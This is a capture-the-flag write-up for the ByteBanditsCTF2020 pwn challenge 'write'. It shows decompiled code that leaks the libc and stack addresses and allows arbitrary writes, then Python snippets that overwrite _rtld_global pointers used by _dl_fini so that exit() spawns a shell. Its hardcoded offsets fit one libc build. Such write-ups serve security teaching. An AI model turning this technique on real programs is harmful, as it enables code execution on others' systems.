## write
### Description

> You can write, what can you byte.
>
> nc pwn.byteband.it 9000


### Attachment

[write](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ByteBanditsCTF2020/pwn/write/write)

### Analysis

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp){
  // ...
  printf("puts: %p\n", &puts, argv);
  printf("stack: %p\n", &v4);
  while ( 1 ){
    puts("===Menu===");
    puts("(w)rite");
    puts("(q)uit");
    fgets(&s, 2, stdin);
    if ( s == 'q' )
      break;
    if ( s == 'w' ){
      printf("ptr: ", 2LL);
      __isoc99_scanf("%lu", &v3);
      printf("val: ");
      __isoc99_scanf("%lu", &v4);
      *v3 = v4;
    }
  }
  exit(0);
}
```

* address of `libc` and `stack` were given  
* choose `w` to overwrite any memory with any values (unlimited times)
* choose `q` to call `exit(0)`

### Solution

#### calc base address of libc

```python
ru('puts: ')
puts = eval(rc(14))
ru('stack: ')
stack = eval(rc(14))
libcbase = puts - libc.sym['puts']
info_addr('libcbase',libcbase)
```

#### overwrite ptr in `_dl_fini`

there are 2 pointer used in `_dl_fini+98` and `_dl_fini+105`

> the program will execute to `_dl_fini` after `exit` called

![](http://image.taqini.space/img/20200414014802.png)

all of them are in `_rtld_golbal` :

```python
ptr = libcbase+0x619f60 #0x239f68
info_addr('ptr',ptr)
system = libcbase+libc.sym['system']
info_addr('system',system)
rdi = libcbase+0x619968 #0x239968
info_addr('rdi',rdi)
```

overwrite `_rtld_golbal+2312` with `/bin/sh` and overwrite `_rtld_golbal+3834` with address of `system`:

```python
sl('w')
sl(str(ptr))
sl(str(system))

sl('w')
sl(str(rdi))
sl(str(u64('/bin/sh\0')))
```

### getshell

`system("/bin/sh")` will be executed after after call `exit` 

```python
sl('q')
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/ByteBanditsCTF2020/pwn/write) 